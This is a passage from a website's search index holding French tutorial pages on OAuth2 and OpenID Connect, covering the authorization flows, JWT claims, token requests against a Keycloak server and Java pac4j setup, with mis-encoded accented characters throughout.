doit se faire avec sa vÃ©ritable identitÃ© \u0026ldquo;Alphonse Robichu\u0026rdquo; et non avec un compte gÃ©nÃ©rique.\nsequenceDiagram actor U as Alphonse participant A as AppGestion participant S as AppStock box LightGrey Authorization Server participant E as Authentication Endpoint participant F as Token Endpoint end U-\u0026gt;\u0026gt;A: Hello ! A-\u0026gt;\u0026gt;U: 302 Authentifie toi ! U-\u0026gt;\u0026gt;E: AppGestion me demande me m\u0026#39;authentifier chez toi U-\u0026gt;\u0026gt;E: Login (id/mdp par exemple) U--\u0026gt;\u0026gt;E: Consentement E-\u0026gt;\u0026gt;U: 302 Donne ce code Ã  AppGestion U-\u0026gt;\u0026gt;A: Voici le code fourni par l\u0026#39;IDP A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un jeton contre ce code ? F-\u0026gt;\u0026gt;A: {accessToken, refreshToken} A-\u0026gt;\u0026gt;A: check {accessToken} loop A-\u0026gt;\u0026gt;S: get /resource/stocks muni de {accessToken} S-\u0026gt;\u0026gt;S: check {accessToken} S-\u0026gt;\u0026gt;A: /ressource/stocks end Note over A,S: {accessToken} expirÃ© A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un nouveau jeton contre ce {refreshToken} ?  Le consentement #  Avec un fournisseur d\u0026rsquo;identitÃ© partagÃ©, potentiellement sur plusieurs domaines diffÃ©rents, se pose la question du consentement Le fournisseur d\u0026rsquo;identitÃ© va transmettre un certain nombre d\u0026rsquo;information Ã  l\u0026rsquo;application cliente via le jeton Le ressource owner peut contrÃ´ler les informations transmises  Exemple\n Un service lambda vous propose de vous athentifiez avec Facebook, Facebook vous avertit des informations qui vont Ãªtre transmises au site tiers  Les jetons #  Access token : marqueur de l\u0026rsquo;identitÃ©. On doit Ãªtre capable via son contenu signÃ© et/ou via requete au serveur d\u0026rsquo;autorisation d\u0026rsquo;associer de faÃ§on fiable une identitÃ© Ã  un access token Refresh token : NE doit servir QU\u0026rsquo;une seule fois pour obtenir un nouveau couple {access token, refresh token} Il existe aussi l\u0026rsquo;ID Token initialement dÃ©diÃ© pour porter les information d\u0026rsquo;identitÃ©. La spec OAuth ne prÃ©cisant rien sur le format des access token. Dans la pratique on peut rendre Ã©gaux les Access et ID Token  ConfidentialitÃ© des jeton Les information stockÃ©es dans le jeton NE sont pas CHIFFRÃ‰ES. Dans un mode qui utilise massivement https, la sÃ©curitÃ© de OAuth2 se base grandement sur HTTPS. On considÃ¨re que le jetons non chiffrÃ© tansite toujours sur un canal chiffrÃ©s.\nIntÃ©gritÃ© du jeton MÃªme sur un canal chiffrÃ©, n\u0026rsquo;importe qui pourrait forger un access token ressemblant Ã  un access token au nom de Alphonse Robichu mais non issu du serveur d\u0026rsquo;autorisation.\nL\u0026rsquo;unique mÃ©thode de controle prÃ©sentÃ© ici sera la signature.\nLes diffÃ©rents flows # Authorization code # C\u0026rsquo;est le mode de fonctionnement Standard prÃ©sentÃ© dans la partie prÃ©cÃ©dente\n1/ login =\u0026gt; code 2/ code =\u0026gt; token\nUsage ? SystÃ©matique Ã  moins de rentrer dans les cas suivants !\nEn particulier dans le cadre d\u0026rsquo;application de type \u0026ldquo;exÃ©cution serveur\u0026rdquo; au sein d\u0026rsquo;un mÃªme SI, il permet de limiter grandement la circulation des access token sur le rÃ©seau.\nImplicite : DÃ‰PRÃ‰CIÃ‰ !!! # Ressemble fortement au prÃ©cÃ©dent mais en simplifiÃ©\n1/ login =\u0026gt; token\nClairement, le serveur fournit directement un token dans la redirection et non un code Ã  Ã©changer. Ce flow Ã©tait historiquement utilisÃ© dans le cadre des applications de type javascript Ã©xÃ©cutÃ©s dans le navigateur acr le code semblait alourdir le flow sans apporter de gains de sÃ©curitÃ©.\nLa position a Ã©tÃ© depuis revu pour vaforiser le flow Authorization code dans ce contexte Ã©galement\nResource Owner Password Credentials ou Direct Grant # sequenceDiagram actor U as Alphonse participant A as AppGestion participant S as AppStock box LightGrey Authorization Server participant F as Token Endpoint end U-\u0026gt;\u0026gt;A: Hello ! A-\u0026gt;\u0026gt;U: Ton login et mot de passe ? U-\u0026gt;\u0026gt;A: Login id/mdp A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un jeton contre ces id/mdp ? F-\u0026gt;\u0026gt;A: {accessToken, refreshToken} A-\u0026gt;\u0026gt;A: check {accessToken} loop A-\u0026gt;\u0026gt;S: get /resource/stocks muni de {accessToken} S-\u0026gt;\u0026gt;S: check {accessToken} S-\u0026gt;\u0026gt;A: /ressource/stocks end Note over A,S: {accessToken} expirÃ© A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un nouveau jeton contre ce {refreshToken} ?  Usage ?\nCe flow est Ã  rÃ©server aux applications qui ne peuvent pas gÃ©rer des redirections, typiquement des applications \u0026ldquo;lourdes\u0026rdquo; installÃ©es sur un poste. A noter que la grande diffÃ©rence avec le flow Standard est que l\u0026rsquo;application cliente connait le mot de passe de l\u0026rsquo;utilisateur, ce que l\u0026rsquo;on cherche plutÃ´t Ã  Ã©viter avec l\u0026rsquo;utilisation d\u0026rsquo;un fournisseur d\u0026rsquo;identitÃ©.\nClient Credentials Grant # sequenceDiagram participant A as AppGestion participant S as AppStock box LightGrey Authorization Server participant F as Token Endpoint end A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un jeton en tant que appGestion ? F-\u0026gt;\u0026gt;A: {accessToken, refreshToken} A-\u0026gt;\u0026gt;A: check {accessToken} loop A-\u0026gt;\u0026gt;S: get /resource/stocks muni de {accessToken} S-\u0026gt;\u0026gt;S: check {accessToken} S-\u0026gt;\u0026gt;A: /ressource/stocks end A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un nouveau jeton contre ce {refreshToken} ?  Le jeton d\u0026rsquo;accÃ¨s propre au client et non Ã  un utilisateur\nUsage ?\nSoit dans les cas oÃ¹ l\u0026rsquo;on a pas d\u0026rsquo;utilisateur du tout comme un batch. Soit dans les cas oÃ¹ on considÃ¨re que l\u0026rsquo;accÃ¨s au web service \u0026ldquo;backend\u0026rdquo; n\u0026rsquo;a pas de sens Ã  Ãªtre identifiÃ© en tant qu\u0026rsquo;utilisateur.\nLe jeton JWT # Les jetons Ã©changÃ©s seront sous un format dit JWT, JSON Web Token.\nLes donnÃ©es au format JSON, en trois parties : header, payload et signature\nHeader # { \u0026quot;alg\u0026quot;: \u0026quot;RS256\u0026quot;, \u0026quot;typ\u0026quot;: \u0026quot;JWT\u0026quot;, \u0026quot;kid\u0026quot;: \u0026quot;eYjLrajOiGhn_R3Yfmok2c3v3PrUZZ9ibXob0MowXvw\u0026quot; }  PrÃ©sente notamment l\u0026rsquo;algorithme de signature utilisÃ©, dans l\u0026rsquo;exemple ici, le jeton est signÃ© avec une signature asymÃ©trique. Le serveur d\u0026rsquo;authentification possÃ¨de une clÃ© privÃ©e secrÃ¨te avec laquelle il a signÃ©e le jeton.\nIl diffuse ouvertement sa clÃ© publique qui permet de controller la signature.\nPayload # { \u0026quot;exp\u0026quot;: 1528739605, \u0026quot;iat\u0026quot;: 1528739305, \u0026quot;iss\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation\u0026quot;, \u0026quot;aud\u0026quot;: \u0026quot;client-test-web\u0026quot;, \u0026quot;typ\u0026quot;: \u0026quot;Bearer\u0026quot;, \u0026quot;azp\u0026quot;: \u0026quot;client-test-web\u0026quot;, \u0026quot;auth_time\u0026quot;: 1528739299, \u0026quot;session_state\u0026quot;: \u0026quot;ac727f77-fcc4-403c-9765-6ee58bc980f5\u0026quot;, \u0026quot;acr\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;roles\u0026quot;: [\u0026quot;Responsable_Clients\u0026quot;,\u0026quot;Gestionnaire_Stocks\u0026quot;], \u0026quot;name\u0026quot;: \u0026quot;Alphonse Robichu\u0026quot;, \u0026quot;preferred_username\u0026quot;: \u0026quot;id\u0026quot;, \u0026quot;given_name\u0026quot;: \u0026quot;Alphonse\u0026quot;, \u0026quot;family_name\u0026quot;: \u0026quot;Robichu\u0026quot;, \u0026quot;email\u0026quot;: \u0026quot;alphonse.robichu@my.org\u0026quot; }  Les infos \u0026ldquo;utiles\u0026rdquo; transitÃ©s par le jeton dont certaines dÃ©diÃ©es aux contrÃ´le ou Ã  des prÃ©cisions sur le mode d\u0026rsquo;authentification telles que - iat : le serveur qui a Ã©mis le jeton - exp : la date d\u0026rsquo;expiration du jeton - acr : le niveau de fiabilitÃ© de l\u0026rsquo;authentification (nombre de facteurs par exemple)\nOn appelle claim chaque Ã©lÃ©ment de ce jeton.\nLes fournisseur d\u0026rsquo;identitÃ© fournissent gÃ©nÃ©ralement un ensemble de claim par dÃ©faut mais le client est censÃ© prÃ©ciser les claims requi via un paramÃ¨tre de scope Ã  convenir entre client et serveur d\u0026rsquo;autorisation.\n\u0026ldquo;Je suis appGestion\u0026rdquo; : comment vÃ©rifier ? # Par identifiant/mot de passe ? # On va parler de client_id et de client_secret\nEfficace dans le cas ou AppGestion est une application purement serveur (pas une appli javascript tournant dans un navigateur) ou dans les cas Direct Grant et Client Credential.\nDans le cas de Client Credential, c\u0026rsquo;est d\u0026rsquo;ailleurs l\u0026rsquo;unique protection de rÃ©cupÃ©ration du jeton.\nCette vÃ©rification est totalement inÃ©fficace dans le cas d\u0026rsquo;une application de type javascript tournant sur navigateur, en effet dela reviendrait Ã  Ã©crire le mot de passe dans le code source recu par l\u0026rsquo;utilisateur\u0026hellip;\nDans ce dernier cas, les requÃªtes sur /token seront donc non authentifiÃ©es.\nSi une application cliente possÃ¨de un mot de passe on parlera de client confidential, sinon c\u0026rsquo;est un client public\nPar url de redirection ? # Quand le cas du flow Standard, la redirection va forcÃ©ment faire mention Ã  l\u0026rsquo;url de retour vers l\u0026rsquo;application. On peut donc contrÃ´ler le format de cette url et empecher de renvoyer vers une url qui n\u0026rsquo;est pas censÃ©e Ãªtre utilisÃ©e en fonctionnement normal.\nCette protection n\u0026rsquo;a aucune signification dans le cas de Direct Grant ou de Client Credential.\nPar url d\u0026rsquo;origine ? # Dans le cas des application de type javascript Ã©xÃ©cutÃ©es dans navigateur, les requetes /token seront Ã©xÃ©cutÃ©es depuis les script et un navigateur effectuera ainsi la protection CORS.\nCas du web service \u0026ldquo;backend\u0026rdquo; # Si un service n\u0026rsquo;est pas une ihm, il n\u0026rsquo;est pas censÃ© demander une identitÃ© mais uniquement les contrÃ´ler.\nOn differencie explicitement les application comme AppGestion dans l\u0026rsquo;exemple :\n ont une ihm les utilisateurs s\u0026rsquo;y connecte en n\u0026rsquo;tÃ©ant pas encore authentifiÃ© l\u0026rsquo;application doit Ãªtre en mesure de rediriger vers l\u0026rsquo;idp, donc de \u0026ldquo;crÃ©er\u0026rdquo; un identitÃ© l\u0026rsquo;application gÃ¨re des sessions de faÃ§on Ã  ne pas rÃ©authentifier l\u0026rsquo;utilisateur Ã  chaque requÃªte  de l\u0026rsquo;application web service de gestion des stocks qui :\n n\u0026rsquo;a pas d\u0026rsquo;ihm n\u0026rsquo;est censÃ© recevoir que des requÃªtes identifiÃ©es \u0026ldquo;explicitement\u0026rdquo; n\u0026rsquo;est pas censÃ© rÃ©agir Ã  une requete anonyme autrement que par 401 l\u0026rsquo;identitÃ© est revÃ©rifiÃ©e Ã  chaque requÃªte (pas de gestion de session)  On parlera pour ce dernier type d\u0026rsquo;application, d\u0026rsquo;application bearer-only, c\u0026rsquo;est Ã  dire dont le seul mode d\u0026rsquo;authentification doit Ãªtre la prÃ©sence d\u0026rsquo;un jeton dans la requÃªte.\nCes applications n\u0026rsquo;ont en gÃ©nÃ©ral pas Ã  Ãªtre connu du fournisseur d\u0026rsquo;identitÃ©\nEt le swagger ? # Le swagger n\u0026rsquo;est PAS l\u0026rsquo;api, c\u0026rsquo;est techniquement une seconde application exposÃ©e sur le mÃªme serveur que l\u0026rsquo;api qui doit Ãªtre traitÃ©e comme une application Ã  part entiÃ¨re.\nEn l\u0026rsquo;occurence il s\u0026rsquo;agit d\u0026rsquo;une application de type javascript Ã©xÃ©cutÃ©e sur navigateur.\nLes requÃªtes Ã  la loupe # Les mÃ©canismes de sÃ©curitÃ© # sequenceDiagram actor U as Alphonse participant A as AppGestion participant S as AppStock participant E as Authentication Server \u0026lt;br/\u0026gt; (/auth et /token) U-\u0026gt;\u0026gt;A: Hello ! note over A: GÃ©nÃ©ration d\u0026#39;un state et d\u0026#39;un nonce alÃ©atoire A-\u0026gt;\u0026gt;U: 302 avec redirect_uri \u0026#43; state \u0026#43; nonce U-\u0026gt;\u0026gt;E: authentifie moi et retour vers redirect_uri note over E: sauvegarde du nonce en session note over E: genÃ©ration alÃ©atoire d\u0026#39;un session_state E-\u0026gt;\u0026gt;U: 302 code \u0026#43; state (passe plat) \u0026#43; session_state \u0026#43; aud U-\u0026gt;\u0026gt;A: code \u0026#43; state (passe plat) \u0026#43; session_state \u0026#43; aud note over A: contrÃ´le du state A-\u0026gt;\u0026gt;E: code E-\u0026gt;\u0026gt;A: {accessToken, refreshToken, session_state} note over A: controle du session_state A-\u0026gt;\u0026gt;A: check {accessToken} note over A: lecture et contrÃ´le du claim nonce de l\u0026#39;accessToken \u0026lt;br/\u0026gt; (en plus de la signature) note over A: controle du claim aud A-\u0026gt;\u0026gt;S: get /resource/stocks muni de {accessToken} note over S: controle du claim aud  Le state ?\n Ã‰viter les attaque CSRF par un controle du dÃ©roulÃ© du processus   Il s\u0026rsquo;agissait d\u0026rsquo;une protection essentielle dans le cadre du flow implicit\n session_state et nonce ?\n Ã‰viter le rejeu, il permet d\u0026rsquo;Ã©viter de renvoyer un jeton interceptÃ© encore valable vers d\u0026rsquo;autre service. On parle de contrÃ´le de corrÃ©lation entre requÃªtes et rÃ©ponse d\u0026rsquo;authentification  Les Ã©lÃ©ments nonce, session_state sont maintenu dans la session de l\u0026rsquo;utilisateur cÃ´tÃ© fournisseur d\u0026rsquo;identitÃ©. La session de l\u0026rsquo;utilisateur cotÃ© fournisseur d\u0026rsquo;identitÃ© (idle et max) doit donc Ãªtre cohÃ©rente avec la durÃ©e de rafraichissement possible du jeton (penser aux cas de formulaire long Ã  remplir).\naud ? ou Audience\n paramÃ©trÃ© par le fournisseur d\u0026rsquo;identitÃ© par client, il permet de prÃ©ciser la portÃ©e d\u0026rsquo;usage du jeton. L\u0026rsquo;audience peut Ãªtre vÃ©rifiÃ© sur un web service transitif. Ce claim permet de distinguer des zones d\u0026rsquo;usage des tokens.  Flow Authorization Code # Connexion Ã  Appgestion, redirection vers l\u0026rsquo;authorization server.\nGET https://mon.fournisseur.identite/auth ?redirect_uri=https://mon.appli.gestion/sso/callback \u0026amp;state=9115c618-b01c-4966-a26e-8171caf30dcf \u0026amp;.......   Le paramÃ¨tre redirect_uri permet le contrÃ´le de l\u0026rsquo;url de l\u0026rsquo;application de gestion oÃ¹ sera envoyÃ© le code Le paramÃ¨tre state est gÃ©nÃ©rÃ© alÃ©atoirement par le client, il permet d\u0026rsquo;Ã©viter les attaque de type CSRF, il devra Ãªtre renvoyÃ© et contrÃ´lÃ© par le client au retour : l\u0026rsquo;application le stocke associÃ© Ã  la session de l\u0026rsquo;utilisateur  Suite Ã  l\u0026rsquo;authentification sur l\u0026rsquo;authorization server, redirection vers l\u0026rsquo;application\nGET https://mon.appli.gestion/sso/callback ?state=9115c618-b01c-4966-a26e-8171caf30dcf \u0026amp;session_state=cc84a1d5-2f0e-4100-aef9-be6aa4278d91 \u0026amp;code=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.[...] \u0026amp;.......   Le state permet donc de s\u0026rsquo;assurer que l\u0026rsquo;application est bien initiatrice du processus d\u0026rsquo;authentification Le session_state est gÃ©nÃ©rÃ© alÃ©atoirement par le fournisseur d\u0026rsquo;identitÃ©, dans la mÃªme logique que le state, il permettra de corrÃ©ler la demande d\u0026rsquo;authentification au reste du processus (notamment pour Ã©viter les rejeu) Le code Ã  Ã©changer contre un token. A noter que durant sa durÃ©e de validitÃ©, le code est autant critique que le mot de passe de l\u0026rsquo;utilisateur  L\u0026rsquo;application demande un jeton\nPOST https://mon.fournisseur.identite/token/token Authorization: Basic YXBwbGktdGVzdDphOWUzMmYzMC1hNzFiLTQ0Y2ItODQwMi1iZjdkY2VmNzlhMTM= # appli-test:[Secret] Content-Type: application/x-www-form-urlencoded; charset=UTF-8 [...] grant_type=authorization_code \u0026amp;code=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.[...]   grant_type : le type de troc demandÃ© au serveur, ici on va Ã©changer un code contre un token la code l\u0026rsquo;authentification du client le cas Ã©chÃ©ant en authentification Basic  Dans le cas de client public (javascript), il n\u0026rsquo;y a donc pas d\u0026rsquo;entete Authorization\nSi tout se pass bien, le serveur d\u0026rsquo;autorisation va donc rÃ©pondre :\n{ \u0026quot;access_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;expires_in\u0026quot;:300, \u0026quot;refresh_expires_in\u0026quot;:1800, \u0026quot;refresh_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;token_type\u0026quot;:\u0026quot;bearer\u0026quot;, \u0026quot;id_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;not-before-policy\u0026quot;:0, \u0026quot;session_state\u0026quot;:\u0026quot;34dc14d5-bbd0-4c15-86b4-2d40629e0ced\u0026quot;, \u0026quot;scope\u0026quot;:\u0026quot;\u0026quot; }  On retrouve notamment le session_state permettant de controller la corrÃ©lation des demandes.\nOn obtient donc les diffÃ©rents token attendus :\n L\u0026rsquo;access token qui peut Ã©galer l\u0026rsquo;ID token dans son contenu \u0026ldquo;utile\u0026rdquo; mais qui est censÃ© Ãªtre le seul Ã  pouvoir donner authentification via Ã©change de jeton. A noter que durant sa durÃ©e de validitÃ©, l\u0026rsquo;access token est autant critique que le mot de passe de l\u0026rsquo;utilisateur. Comme il peut Ãªtre ammenÃ© Ã  beaucoup circuler sur le rÃ©seau, sa durÃ©e de validitÃ© est censÃ© Ãªtre trÃ¨s rÃ©duite (recommandÃ© vers 5 minutes). le refresh token est censÃ© Ãªtre Ã  usage unique, pour renouveler la demande prÃ©cÃ©dente mais en Ã©pargnant l\u0026rsquo;utilisateur d\u0026rsquo;aller rechercher un code.  POST https://mon.fournisseur.identite/token/token Authorization: Basic YXBwbGktdGVzdDphOWUzMmYzMC1hNzFiLTQ0Y2ItODQwMi1iZjdkY2VmNzlhMTM= Content-Type: application/x-www-form-urlencoded; charset=UTF-8 [...] grant_type=refresh_token\u0026amp;refresh_token=eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]  (Et toujours dans le cas de client public : pas d\u0026rsquo;entete Authorization)\n{ \u0026quot;access_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;expires_in\u0026quot;:300, \u0026quot;refresh_expires_in\u0026quot;:1800, \u0026quot;refresh_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;token_type\u0026quot;:\u0026quot;bearer\u0026quot;, \u0026quot;id_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;not-before-policy\u0026quot;:0, \u0026quot;session_state\u0026quot;:\u0026quot;2bf0c940-ac60-488c-bc32-d6ced922f90d\u0026quot;, \u0026quot;scope\u0026quot;:\u0026quot;\u0026quot; }  A noter que l\u0026rsquo;on obtient un nouveau refresh token qui est censÃ© invalider le prÃ©cÃ©dent\nUn refresh token ne circule donc en Ã©tant valide que deux fois sur le rÃ©seau, d\u0026rsquo;oÃ¹ la fait que sa durÃ©e peut Ãªtre longue (chiffrÃ©e en heures).\nContrÃ´le du jeton # Le serveur doit connaitre la clÃ© publique du serveur d\u0026rsquo;autorisation pour valider les access-token (c\u0026rsquo;est d\u0026rsquo;ailleurs l\u0026rsquo;unique vÃ©rification faite dans le cas d\u0026rsquo;un bearer-only)\nLa clÃ© publique de validation de la signature peut Ãªtre stockÃ©e en dÃ»r dans l\u0026rsquo;application cliente.\nOn peut aussi la demander au serveur d\u0026rsquo;autorisation.\nGET https://mon.foutrnisseur.identite/.well-known/openid-configuration  { \u0026quot;issuer\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation\u0026quot;, \u0026quot;authorization_endpoint\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/auth\u0026quot;, \u0026quot;token_endpoint\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/token\u0026quot;, \u0026quot;end_session_endpoint\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/logout\u0026quot;, \u0026quot;jwks_uri\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/certs\u0026quot;, ... }  Connexion Ã  un service bearer-only # GET https://ma.gestion.de.stocks/stocks/ressource Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]  L\u0026rsquo;acces token est envoyÃ© brut dans l\u0026rsquo;entÃªte Authorization\nFlow Client Credentials #  RÃ©cupÃ©ration d\u0026rsquo;un jeton :  POST auth/realms/formation/protocol/openid-connect/token Content-Type: application/x-www-form-urlencoded grant_type=client_credentials\u0026amp;client_id=YOUR_CLIENT_ID\u0026amp;client_secret=YOUR_CLIENT_SECRET  { \u0026quot;access_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, ... }  Configuration OpenIDConnect # L\u0026rsquo;appli cliente doit connaitre quelques endpoints du serveur d\u0026rsquo;autorisation\n endpoint auth endpoint token enpoint jwks (clÃ©s publiques)  ces endpoints sont de faÃ§on standard donnÃ©s sur l\u0026rsquo;url https://mon.foutrnisseur.identite/.well-known/openid-configuration\nUne configuration doit Ãªtre nÃ©gociÃ©e entre l\u0026rsquo;application client et le serveur d\u0026rsquo;autorisation\n Le client_id Le client_secret le cas Ã©chÃ©ant (donc pas pour les applis javascript)  Une application de bearer-only n\u0026rsquo;a besoin que de la clÃ© publique de validation ou de l\u0026rsquo;url pour l\u0026rsquo;obtenir.\nCette url est accessible sans authentification, il n\u0026rsquo;est pas nÃ©cessaire de configurer le fournisseur d\u0026rsquo;dentitÃ© autour de l\u0026rsquo;identitÃ© du client bearer-only\nLe concept d\u0026rsquo;expiration rapide de l\u0026rsquo;access token et de renouvellement entraine gÃ©nralement plusieurs configuration requisse sur la politique de renouvellement des jeton\n A chaque requÃªte ? AprÃ¨s expiration ? Toutes les n secondes fixes ? n secondes avant expiration ?  Des configurations plus applicatives sont souvent demandÃ©es telles que le claim fournissant le nom d\u0026rsquo;utilisateur ou la liste de ses habilitations\n"}).add({id:15,href:"/docs/authentification/oidc/",title:"OpenID Connect",description:"",content:""}).add({id:16,href:"/docs/authentification/oidc/oidc-java/",title:"OpenID Connect en java",description:"Les adapters Java # Une sÃ©lection : https://oauth.net/code/java/\nA ne plus utiliser car dÃ©prÃ©ciÃ© par la communautÃ© : https://www.keycloak.org/docs/latest/securing_apps/#java-adapters\n Adapters liÃ©s Ã  une plateforme fortement dÃ©conseillÃ©s, car ils crÃ©ent des dÃ©pendances \u0026ldquo;Hors Maven\u0026rdquo;  Mise en place de OpenIDConnect dans une application Java\n Avec pac4j https://www.pac4j.org/  Situation application quelconque JavaEE, application de type ihm en java   Avec Spring security  Situation application Spring Boot, application de type Web Service    OIDC et Pac4j # Pac4j # DÃ©pendances modules jee + oidc:",content:"Les adapters Java # Une sÃ©lection : https://oauth.net/code/java/\nA ne plus utiliser car dÃ©prÃ©ciÃ© par la communautÃ© : https://www.keycloak.org/docs/latest/securing_apps/#java-adapters\n Adapters liÃ©s Ã  une plateforme fortement dÃ©conseillÃ©s, car ils crÃ©ent des dÃ©pendances \u0026ldquo;Hors Maven\u0026rdquo;  Mise en place de OpenIDConnect dans une application Java\n Avec pac4j https://www.pac4j.org/  Situation application quelconque JavaEE, application de type ihm en java   Avec Spring security  Situation application Spring Boot, application de type Web Service    OIDC et Pac4j # Pac4j # DÃ©pendances modules jee + oidc:\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.pac4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jakartaee-pac4j\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;7.1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.pac4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pac4j-oidc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.7.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;   Une classe de configuration  public class DemoConfigFactory implements ConfigFactory { @Override public Config build(final Object... parameters) { } }   DÃ©finition des protocoles d\u0026rsquo;authentification  OidcConfiguration oidcConfig = new OidcConfiguration(); oidcConfig.setClientId(clientId); oidcConfig.setSecret(clientSecret); oidcConfig.setDiscoveryURI(configurationEndpoint); OidcClient oidcClient = new OidcClient(oidcConfig);   DÃ©finition de l\u0026rsquo;url de callback (= ou est ce que l\u0026rsquo;on revient aprÃ¨s authentification sur le serveur central)  oidcClient.setCallbackUrl(\u0026quot;/callback\u0026quot;);   Ce endpoint doit Ãªtre interceptÃ©  \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;callbackFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.pac4j.jee.filter.CallbackFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;callbackFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/callback\u0026lt;/url-pattern\u0026gt; \u0026lt;dispatcher\u0026gt;REQUEST\u0026lt;/dispatcher\u0026gt; \u0026lt;/filter-mapping\u0026gt;   DÃ©finition de la liste de client (plusieurs mode d\u0026rsquo;authentification possible potentiellement : oidc + basic par exemple)  Config config = new Config(oidcClient);   DÃ©finition de rÃ¨gles et conditions  config.addAuthorizer(\u0026quot;admin\u0026quot;, new RequireAnyRoleAuthorizer(\u0026quot;ROLE_ADMIN\u0026quot;)); config.addAuthorizer(\u0026quot;mustBeAuthent\u0026quot;,new IsAuthenticatedAuthorizer()); config.addMatcher(\u0026quot;excludedPath\u0026quot;, new PathMatcher().excludeRegex(\u0026quot;^\\\\/(accueil)?$\u0026quot;));   Activables selon les endpoints  \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;oidcFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.pac4j.jee.filter.SecurityFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;configFactory\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;fr.insee.demo.security.DemoConfigFactory\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;authorizers\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;mustBeAuthent,csrfToken\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;matchers\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;excludedPath\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;oidcFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt;  Obtenir le jeton # WebContext context = new JEEContext(request, response); ProfileManager manager = new ProfileManager(context,JEESessionStore.INSTANCE); Optional\u0026lt;UserProfile\u0026gt; profile = manager.getProfile(); OidcProfile oidcProfile = (OidcProfile) profile.get(); Map h = 